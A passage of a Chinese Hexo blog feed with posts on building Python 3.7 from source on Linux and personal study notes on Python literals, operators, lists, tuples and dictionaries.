class="number">279.5084971874737</span> <span class="number">1.4422495703074083</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python语感专项</category>
      </categories>
      <tags>
        <tag>python语感</tag>
        <tag>others</tag>
      </tags>
  </entry>
  <entry>
    <title>python环境搭建</title>
    <url>/2020/01/22/blog_formal/%E5%BC%80%E5%8F%91/python/python%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="python环境搭建"><a href="#python环境搭建" class="headerlink" title="python环境搭建"></a>python环境搭建</h1><h2 id="Linux下搭建"><a href="#Linux下搭建" class="headerlink" title="Linux下搭建"></a>Linux下搭建</h2><p>Python3 最新源码，二进制文档，新闻资讯等可以在 Python 的官网查看到：</p>
<p>Python 官网：<a href="https://www.python.org/" target="_blank" rel="noopener">https://www.python.org/</a></p>
<p>可以在以下链接中下载 Python 的文档，下载 HTML、PDF 和 PostScript 等格式的文档。</p>
<p>Python文档下载地址：<a href="https://www.python.org/doc/" target="_blank" rel="noopener">https://www.python.org/doc/</a></p>
<p>python源码地址：<a href="https://www.python.org/downloads/source/" target="_blank" rel="noopener">https://www.python.org/downloads/source/</a></p>
<a id="more"></a>

<p><img data-src="./python%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1.png" alt></p>
<p><img data-src="./python%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/2.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/3.7.6/Python-3.7.6.tar.xz</span><br></pre></td></tr></table></figure>



<h2 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install gcc g++ zlib*</span><br><span class="line"></span><br><span class="line">tar -xvf Python-3.7.6.tar.xz</span><br><span class="line">cd Python-3.7.6</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">    [root@instance-t6n4w8xd Python-3.7.6]# python3 -V</span><br><span class="line">    Python 3.7.6</span><br><span class="line">    [root@instance-t6n4w8xd Python-3.7.6]# pip3 -V</span><br><span class="line">    pip 19.2.3 from /usr/local/lib/python3.7/site-packages/pip (python 3.7)</span><br></pre></td></tr></table></figure>

<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><h3 id="ipython-方便命令行启动pyhon"><a href="#ipython-方便命令行启动pyhon" class="headerlink" title="ipython 方便命令行启动pyhon"></a>ipython 方便命令行启动pyhon</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install ipython</span><br></pre></td></tr></table></figure>



<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>1 WARNING: pip is configured with locations that require TLS/SSL, however the ssl module in Python is not available.</p>
<p>原因：在<code>./configure</code>过程中，如果没有加上<code>–with-ssl</code>参数时，默认安装的软件涉及到ssl的功能不可用，刚好pip3过程需要ssl模块，而由于没有指定，所以该功能不可用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y openssl-devel</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 重新编译</span></span><br><span class="line">./configure --with-ssl</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<p>2 No module named ‘_ctypes’</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install libffi-devel -y</span><br><span class="line"></span><br><span class="line">./configure --enable-optimizations --with-ssl</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>环境配置</tag>
      </tags>
  </entry>
  <entry>
    <title>python自我补充1</title>
    <url>/2020/03/02/blog_formal/%E5%BC%80%E5%8F%91/python/%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A71/</url>
    <content><![CDATA[<h1 id="python-奇淫1"><a href="#python-奇淫1" class="headerlink" title="python 奇淫1"></a>python 奇淫1</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>这个系列主要收录python的一些不常用知识点</p>
<a id="more"></a>

<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="1、数字分割符"><a href="#1、数字分割符" class="headerlink" title="1、数字分割符"></a>1、数字分割符</h3><p>​    为了提高数字的的可读性，Python 3.x 允许使用下划线<code>_</code>作为数字（包括整数和小数）的分隔符。通常每隔三个数字添加一个下划线，类似于英文数字中的逗号。下划线不会影响数字本身的值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">click = <span class="number">1</span>_301_547</span><br><span class="line">distance = <span class="number">384</span>_000_000</span><br><span class="line">print(<span class="string">"click = "</span>, click)</span><br><span class="line">print(<span class="string">"distance = "</span>, distance)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">click =  <span class="number">1301547</span></span><br><span class="line">distance =  <span class="number">384000000</span></span><br></pre></td></tr></table></figure>

<h3 id="2、指数形式"><a href="#2、指数形式" class="headerlink" title="2、指数形式"></a>2、指数形式</h3><p>  指数的表示为aEn 或 aen</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">click = <span class="number">1E5</span></span><br><span class="line">distance = <span class="number">3.84e2</span></span><br><span class="line">print(<span class="string">"type(click) = "</span>, type(click))</span><br><span class="line">print(<span class="string">"click = "</span>, click)</span><br><span class="line">print(<span class="string">"distance = "</span>, distance)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">type(click) =  &lt;<span class="class"><span class="keyword">class</span> '<span class="title">float</span>'&gt;</span></span><br><span class="line">click =  100000.0</span><br><span class="line">distance =  <span class="number">384.0</span></span><br></pre></td></tr></table></figure>

<p><strong>注</strong> ：只要写成指数形式就是小数，即使它的最终值看起来像一个整数 (eg click = 1E5 -&gt; type(click) =  &lt;class ‘float’&gt;)</p>
<h3 id="3、复数"><a href="#3、复数" class="headerlink" title="3、复数"></a>3、复数</h3><p>  python中，复数的虚部以<code>j</code>或者<code>J</code>作为后缀</p>
<h3 id="4、长字符串-amp-amp-原始字符串"><a href="#4、长字符串-amp-amp-原始字符串" class="headerlink" title="4、长字符串 &amp;&amp; 原始字符串"></a>4、长字符串 &amp;&amp; 原始字符串</h3><p>  Python 长字符串由三个双引号<code>&quot;&quot;&quot;</code>或者三个单引号<code>&#39;&#39;&#39;</code>包围，也是多行注释的方法</p>
<p>  python对长字符串的机制</p>
<ul>
<li>在长字符串中放置单引号或者双引号不会导致解析错误</li>
<li>长字符串没有赋值给任何变量，那么这个长字符串就不会起到任何作用，和一段普通的文本无异，相当于被注释</li>
<li>Python 解释器并不会忽略长字符串，也会按照语法解析，只是长字符串起不到实际作用而已</li>
<li>当程序中有大段文本内容需要定义成字符串时，优先推荐使用长字符串形式，非常强大，可以在字符串中放置任何内容，包括单引号和双引号</li>
<li>长字符串中的换行、空格、缩进等空白符都会原样输出</li>
</ul>
<p>python原始字符串,形如这样的 <code>r&quot;\n&quot;</code>  (不会转义)</p>
<h3 id="5、编码相关"><a href="#5、编码相关" class="headerlink" title="5、编码相关"></a>5、编码相关</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># 查看当前环境的编码格式</span></span><br><span class="line">print(sys.getdefaultencoding())</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python 3.x 中可以用 ord() 和 chr() 函数实现字符和编码数字之间的转换</span></span><br><span class="line"><span class="comment"># Python 2.x 中无法使用 ord() 得到指定字符对应的编码数字</span></span><br><span class="line">print(ord(<span class="string">'a'</span>))</span><br><span class="line">print(chr(<span class="number">66</span>))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">utf<span class="number">-8</span></span><br><span class="line"><span class="number">97</span></span><br><span class="line">B</span><br></pre></td></tr></table></figure>

<h3 id="6、byte"><a href="#6、byte" class="headerlink" title="6、byte"></a>6、byte</h3><p>  byte也是一个类，python中都是类！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#通过构造函数创建空 bytes</span></span><br><span class="line">b1 = bytes()</span><br><span class="line"><span class="comment">#通过空字符串创建空 bytes</span></span><br><span class="line">b2 = <span class="string">b''</span></span><br><span class="line"><span class="comment">#通过b前缀将字符串转换成 bytes</span></span><br><span class="line">b3 = <span class="string">b'http://www.caixin.com'</span></span><br></pre></td></tr></table></figure>

<h3 id="7、真假-bool"><a href="#7、真假-bool" class="headerlink" title="7、真假(bool)"></a>7、真假(bool)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 值得一体的是,bool类型可以当做整数对待,True == 1 False == 0 </span></span><br><span class="line"><span class="comment"># 强烈不推荐这么用,会被项目组打死</span></span><br><span class="line">print(<span class="literal">False</span> + <span class="number">1</span>)</span><br><span class="line">print(<span class="literal">True</span> + <span class="number">1</span>)</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 Python 中，所有的对象都可以进行真假值的测试，包括字符串、元组、列表、字典、对象等</span></span><br></pre></td></tr></table></figure>

<h3 id="8、缓存重用机制"><a href="#8、缓存重用机制" class="headerlink" title="8、缓存重用机制"></a>8、缓存重用机制</h3><p>  为了提高程序的执行效率，Python 解释器启动时从内存空间中开辟出一小部分，用来存储高频使用的数据，大大减少高频使用的数据创建时申请内存和销毁时撤销内存的开销</p>
<p>如下图所示:</p>
<p><img data-src="./%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A71/1.png" alt></p>
<p>注：id() 内置函数，该函数的功能是获取变量（对象）所在的内存地址</p>
<p>​        代码块指的是函数和类内部(函数内部的代码属于一个代码块，函数外部的代码属于另一个代码块)</p>
<h3 id="9、转义-amp-amp-数据类型转换"><a href="#9、转义-amp-amp-数据类型转换" class="headerlink" title="9、转义 &amp;&amp; 数据类型转换"></a>9、转义 &amp;&amp; 数据类型转换</h3><p><img data-src="./%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A71/2.png" alt></p>
<p><img data-src="./%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A71/3.png" alt></p>
<h3 id="10、运算符"><a href="#10、运算符" class="headerlink" title="10、运算符"></a>10、运算符</h3><ul>
<li><p>== 和 is 区别: == 用来比较两个变量的值是否相等，而 is 则用来比对两个变量引用的是否是同一个对象(id函数，判断两个对象的内存地址)</p>
</li>
<li><p>逻辑运算符的本质: and 和 or 不一定会计算右边表达式的值，有时候只计算左边表达式的值就能得到最终结果。另外，and 和 or 运算符会将其中一个表达式的值作为最终结果，而不是将 True 或者 False 作为最终结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># case 1</span></span><br><span class="line">print(<span class="number">100</span> <span class="keyword">and</span> <span class="number">200</span>)</span><br><span class="line">print(<span class="number">45</span> <span class="keyword">and</span> <span class="number">0</span>)</span><br><span class="line">print(<span class="string">""</span> <span class="keyword">or</span> <span class="string">"http://www.caixin.com"</span>)</span><br><span class="line">print(<span class="number">18.5</span> <span class="keyword">or</span> <span class="string">"http://www.caixin.com"</span>)</span><br><span class="line"><span class="comment"># case 2</span></span><br><span class="line">url = <span class="string">"http://www.caixin.com"</span></span><br><span class="line">print(<span class="string">"----False and xxx-----"</span>)</span><br><span class="line">print( <span class="literal">False</span> <span class="keyword">and</span> print(url) )  <span class="comment"># False</span></span><br><span class="line">print(<span class="string">"----True and xxx-----"</span>)</span><br><span class="line">print( <span class="literal">True</span> <span class="keyword">and</span> print(url) )  <span class="comment"># True + url</span></span><br><span class="line">print(<span class="string">"----False or xxx-----"</span>)</span><br><span class="line">print( <span class="literal">False</span> <span class="keyword">or</span> print(url) )  <span class="comment"># True + url</span></span><br><span class="line">print(<span class="string">"----True or xxx-----"</span>)  </span><br><span class="line">print( <span class="literal">True</span> <span class="keyword">or</span> print(url) )  <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="number">200</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line">http://www.caixin.com</span><br><span class="line"><span class="number">18.5</span></span><br><span class="line">----<span class="literal">False</span> <span class="keyword">and</span> xxx-----</span><br><span class="line"><span class="literal">False</span></span><br><span class="line">----<span class="literal">True</span> <span class="keyword">and</span> xxx-----</span><br><span class="line">http://www.caixin.com</span><br><span class="line"><span class="literal">None</span></span><br><span class="line">----<span class="literal">False</span> <span class="keyword">or</span> xxx-----</span><br><span class="line">http://www.caixin.com</span><br><span class="line"><span class="literal">None</span></span><br><span class="line">----<span class="literal">True</span> <span class="keyword">or</span> xxx-----</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>三目运算符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">max = a <span class="keyword">if</span> a&gt;b <span class="keyword">else</span> b</span><br><span class="line"><span class="comment"># 嵌套</span></span><br><span class="line">a <span class="keyword">if</span> a&gt;b <span class="keyword">else</span> c <span class="keyword">if</span> c&gt;d <span class="keyword">else</span> d  <span class="comment"># 理解为 a if a&gt;b else ( c if c&gt;d else d )</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>优先级 &amp;&amp; 结合性</p>
</li>
</ul>
<p><img data-src="./%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A71/4.png" alt></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>奇淫</tag>
        <tag>python变量类型和运算符</tag>
      </tags>
  </entry>
  <entry>
    <title>python自我补充2</title>
    <url>/2020/03/04/blog_formal/%E5%BC%80%E5%8F%91/python/%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A72/</url>
    <content><![CDATA[<h1 id="python-奇淫2"><a href="#python-奇淫2" class="headerlink" title="python 奇淫2"></a>python 奇淫2</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>这个系列主要收录python的一些不常用知识点</p>
<a id="more"></a>

<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="1、序列"><a href="#1、序列" class="headerlink" title="1、序列"></a>1、序列</h3><p>​    python中，序列类型包括字符串、列表、元组、集合和字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始化</span></span><br><span class="line">list = [<span class="literal">None</span>]*<span class="number">5</span></span><br><span class="line">print(list)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">[<span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>]</span><br></pre></td></tr></table></figure>

<p>相关内置函数:</p>
<p><img data-src="./%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A72/1.png" alt></p>
<h3 id="2、列表操作"><a href="#2、列表操作" class="headerlink" title="2、列表操作"></a>2、列表操作</h3><ul>
<li>删除列表 <code>del listname</code></li>
<li>添加元素</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># case 1</span></span><br><span class="line">print(<span class="string">"case 1"</span>)</span><br><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">b = [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line">print(a+b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># case 2</span></span><br><span class="line"><span class="comment"># append() 方法传递列表或者元组时，此方法会将它们视为一个整体，作为一个元素添加到列表中，从而形成包含列表和元组的新列表</span></span><br><span class="line">print(<span class="string">"case 2"</span>)</span><br><span class="line">a.append(b)</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># case 3</span></span><br><span class="line"><span class="comment"># extend() 和 append() 的不同之处在于：extend() 不会把列表或者元祖视为一个整体，而是把它们包含的元素逐个添加到列表中</span></span><br><span class="line">print(<span class="string">"case 3"</span>)</span><br><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">a.extend(b)</span><br><span class="line">print(a)</span><br><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">c = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">a.extend(c)</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># case 4</span></span><br><span class="line"><span class="comment"># append() 和 extend() 方法只能在列表末尾插入元素，如果希望在列表中间某个位置插入元素，那么可以使用 insert() 方法</span></span><br><span class="line">print(<span class="string">"case 4"</span>)</span><br><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">a.insert(<span class="number">1</span>, <span class="number">99</span>)</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">case <span class="number">1</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">[<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">case <span class="number">2</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]]</span><br><span class="line">case <span class="number">3</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">case <span class="number">4</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">99</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure>

<ul>
<li>删除元素</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 根据目标元素所在位置的索引进行删除，可以使用 del 关键字或者 pop() 方法</span></span><br><span class="line"><span class="comment"># 根据元素本身的值进行删除，可使用列表(list类型)提供的 remove() 方法</span></span><br><span class="line"><span class="comment"># 将列表中所有元素全部删除，可使用列表(list类型)提供的 clear() 方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># del</span></span><br><span class="line"><span class="comment"># 单个元素  del listname[index]</span></span><br><span class="line"><span class="comment"># 删除中间一段连续的 del listname[start : end]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pop() 删除列表中指定索引处的元素 默认是最后</span></span><br><span class="line"><span class="comment"># listname.pop(index)  # (无push push就是append)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># remove() 根据元素值进行删除</span></span><br><span class="line"><span class="comment"># listname.remove(value)  # remove()方法只会删除第一个和指定值相同的元素，而且必须保证该元素是存在的，否则会引发 ValueError 错误</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># clear() 删除列表所有元素 清空列表</span></span><br><span class="line"><span class="comment"># listname.clear()</span></span><br></pre></td></tr></table></figure>

<ul>
<li>修改元素</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改单个元素</span></span><br><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">a[<span class="number">0</span>] = <span class="number">99</span></span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改一组元素</span></span><br><span class="line"><span class="comment"># Python支持通过切片语法给一组元素赋值。在进行这种操作时，如果不指定步长(step 参数),Python 就不要求新赋值的元素个数与原来的元素个数相同, 这意味, 该操作既可以为列表添加元素, 也可以为列表删除元素</span></span><br><span class="line">nums = [<span class="number">40</span>, <span class="number">36</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">36</span>, <span class="number">100</span>, <span class="number">7</span>]</span><br><span class="line"><span class="comment"># 修改第 1~4 个元素的值（不包括第4个元素）</span></span><br><span class="line">nums[<span class="number">1</span>: <span class="number">4</span>] = [<span class="number">45.25</span>, <span class="number">-77</span>, <span class="number">-52.5</span>]</span><br><span class="line">print(nums)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对空切片(slice)赋值, 就相当于插入一组新的元素</span></span><br><span class="line">nums = [<span class="number">40</span>, <span class="number">36</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">36</span>, <span class="number">100</span>, <span class="number">7</span>]</span><br><span class="line"><span class="comment">#在4个位置插入元素</span></span><br><span class="line">nums[<span class="number">4</span>: <span class="number">4</span>] = [<span class="number">-77</span>, <span class="number">-52.5</span>, <span class="number">999</span>]</span><br><span class="line">print(nums)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除操作</span></span><br><span class="line">nums = [<span class="number">40</span>, <span class="number">36</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">36</span>, <span class="number">100</span>, <span class="number">7</span>]</span><br><span class="line"><span class="comment"># 删除第 1~4 个元素的值（不包括第4个元素）</span></span><br><span class="line">nums[<span class="number">1</span>: <span class="number">4</span>] = []</span><br><span class="line">print(nums)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用切片语法时也可以指定步长(step 参数)，但这个时候就要求所赋值的新元素的个数与原有元素的个数相同</span></span><br><span class="line">nums = [<span class="number">40</span>, <span class="number">36</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">36</span>, <span class="number">100</span>, <span class="number">7</span>]</span><br><span class="line"><span class="comment"># 步长为2，为第1、3、5个元素赋值</span></span><br><span class="line">nums[<span class="number">1</span>: <span class="number">6</span>: <span class="number">2</span>] = [<span class="number">0.025</span>, <span class="number">-99</span>, <span class="number">20.5</span>]</span><br><span class="line">print(nums)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">[<span class="number">99</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">[<span class="number">40</span>, <span class="number">45.25</span>, <span class="number">-77</span>, <span class="number">-52.5</span>, <span class="number">36</span>, <span class="number">100</span>, <span class="number">7</span>]</span><br><span class="line">[<span class="number">40</span>, <span class="number">36</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">-77</span>, <span class="number">-52.5</span>, <span class="number">999</span>, <span class="number">36</span>, <span class="number">100</span>, <span class="number">7</span>]</span><br><span class="line">[<span class="number">40</span>, <span class="number">36</span>, <span class="number">100</span>, <span class="number">7</span>]</span><br><span class="line">[<span class="number">40</span>, <span class="number">0.025</span>, <span class="number">89</span>, <span class="number">-99</span>, <span class="number">36</span>, <span class="number">20.5</span>, <span class="number">7</span>]</span><br></pre></td></tr></table></figure>

<ul>
<li>查找元素</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># index() 方法用来查找某个元素在列表中出现的位置(也就是索引), 如果该元素不存在, 则会导致 ValueError 错误,在查找之前最好使用 count() 方法判断一下</span></span><br><span class="line"><span class="comment"># listname.index(obj, start, end)</span></span><br><span class="line"><span class="comment"># listname 表示列表名称, obj 表示要查找的元素, start 表示起始位置, end 表示结束位置。</span></span><br><span class="line"><span class="comment"># 备注</span></span><br><span class="line"><span class="comment"># 1、start 和 end 参数用来指定检索范围</span></span><br><span class="line"><span class="comment"># 2、start 和 end 可以都不写,此时会检索整个列表</span></span><br><span class="line"><span class="comment"># 3、如果只写 start 不写 end,那么表示检索从 start 到末尾的元素</span></span><br><span class="line"><span class="comment"># 4、如果 start 和 end 都写,那么表示检索 start 和 end 之间的元素</span></span><br><span class="line"><span class="comment"># index() 方法会返回元素所在列表中的索引值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># count() 方法用来统计某个元素在列表中出现的次数</span></span><br><span class="line"><span class="comment"># listname.count(obj) </span></span><br><span class="line"><span class="comment"># listname 代表列表名, obj 表示要统计的元素</span></span><br><span class="line"><span class="comment"># 如果 count() 返回 0,就表示列表中不存在该元素,所以 count() 也可以用来判断列表中的某个元素是否存在</span></span><br></pre></td></tr></table></figure>
<ul>
<li>后记</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># + extend append 三个中, 只有 extend 没有新建list 新列表老列表 id值相同</span></span><br><span class="line"><span class="comment"># del 删除变量名 仅仅是销毁了变量 并没有删除指定位置的数据, del 变量[:] 是删除数据</span></span><br><span class="line"><span class="comment"># 在实际过程中，即便使用 del 关键字删除了指定变量， 且该变量所占用的内存再没有其他变量使用，此内存空间也不会真正地被系统回收并进行二次使用，它只是会被标记为无效内存，系统有自己的机制释放这部分变量</span></span><br><span class="line"><span class="comment"># 手动删除操作如下:</span></span><br><span class="line"><span class="comment"># 引入gc库</span></span><br><span class="line"><span class="keyword">import</span> gc</span><br><span class="line"><span class="comment"># del xxx</span></span><br><span class="line"><span class="comment"># 回收内存地址</span></span><br><span class="line">gc.collect()</span><br></pre></td></tr></table></figure>
<ul>
<li>其他</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># range() 函数的返回值类型为 range，而不是 list。如果想要得到 range() 函数创建的数字列表，需要借助 list() 函数转换</span></span><br><span class="line"><span class="comment"># 用vector可以模拟 stack 和 queue 不过不够高效</span></span><br><span class="line"><span class="comment"># 相对更高效的方法，即使用标准库的 collections 模块中的 deque 结构体，它被设计成在两端存入和读取都很快的特殊 list，可以用来实现栈和队列的功能</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># eg</span></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque </span><br><span class="line">   </span><br><span class="line">queueAndStack = deque()</span><br><span class="line">queueAndStack.append(<span class="number">1</span>)</span><br><span class="line">queueAndStack.append(<span class="number">2</span>)</span><br><span class="line">queueAndStack.append(<span class="string">"hello"</span>)</span><br><span class="line">print(list(queueAndStack))</span><br><span class="line"><span class="comment"># 实现队列功能，从队列中取一个元素，根据先进先出原则，这里应输出 1</span></span><br><span class="line">print(queueAndStack.popleft())</span><br><span class="line"><span class="comment"># 实现栈功能，从栈里取一个元素，根据后进先出原则，这里应输出 hello</span></span><br><span class="line">print(queueAndStack.pop())</span><br><span class="line"><span class="comment"># 再次打印列表</span></span><br><span class="line">print(list(queueAndStack))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="string">'hello'</span>]</span><br><span class="line"><span class="number">1</span></span><br><span class="line">hello</span><br><span class="line">[<span class="number">2</span>]</span><br></pre></td></tr></table></figure>

<h3 id="3、元组"><a href="#3、元组" class="headerlink" title="3、元组"></a>3、元组</h3><ul>
<li>一共有两种创建方式，一种是(), 一种是tuple强转，是不可变的列表(只读版本的list列表) </li>
<li>和列表的区别：1 速度更快 2 占用内存更少</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 元组是一个简化版的列表 因此速度更快</span></span><br><span class="line">C:\Users\caixin&gt;python -m timeit <span class="string">'x=(1,2,3,4,5,6)'</span></span><br><span class="line"><span class="number">50000000</span> loops, best of <span class="number">5</span>: <span class="number">6.88</span> nsec per loop</span><br><span class="line"></span><br><span class="line">C:\Users\caixin&gt;python -m timeit <span class="string">'x=[1,2,3,4,5,6]'</span></span><br><span class="line"><span class="number">50000000</span> loops, best of <span class="number">5</span>: <span class="number">7.06</span> nsec per loop</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------------------------------</span></span><br><span class="line"><span class="comment"># 很好理解 列表属于动态数组，要多维护一个指针 而元组不需要</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>listdemo = list()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tupledemo = tuple()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>listdemo.__sizeof__()</span><br><span class="line"><span class="number">40</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tupledemo.__sizeof__()</span><br><span class="line"><span class="number">24</span></span><br></pre></td></tr></table></figure>

<ul>
<li>后续有兴趣可以看下源码 <a href="https://github.com/python/cpython" target="_blank" rel="noopener">https://github.com/python/cpython</a></li>
</ul>
<h3 id="4、字典"><a href="#4、字典" class="headerlink" title="4、字典"></a>4、字典</h3><ul>
<li><p>创建方式创建带有默认值的字典 <code>dictname = dict.fromkeys(list，value=None)</code></p>
</li>
<li><p>dict()函数创建字典</p>
</li>
</ul>
<p><img data-src="./%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A72/2.png" alt></p>
<ul>
<li><p>删除一个键值对 <code>del dict_name[&#39;key&#39;]</code></p>
</li>
<li><p>keys() 方法用于返回字典中的所有键(key); values() 方法用于返回字典中所有键对应的值(value); items() 用于返回字典中所有的键值对(key-value)</p>
</li>
<li><p>pop() 与 popitem() </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dictname.pop(key) <span class="comment"># 删除指定key</span></span><br><span class="line">dictname.popitem() <span class="comment"># 随机删除一个</span></span><br><span class="line"><span class="comment"># 随机删除也并不是真正意义上的完全删除 底层的字典也是有序的，弹出最后一个键值对</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>setdefault() 方法用来返回某个 key 对应的 value <code>dictname.setdefault(key, defaultvalue)</code> </p>
<ul>
<li>如果该 key 存在，那么直接返回该 key 对应的 value</li>
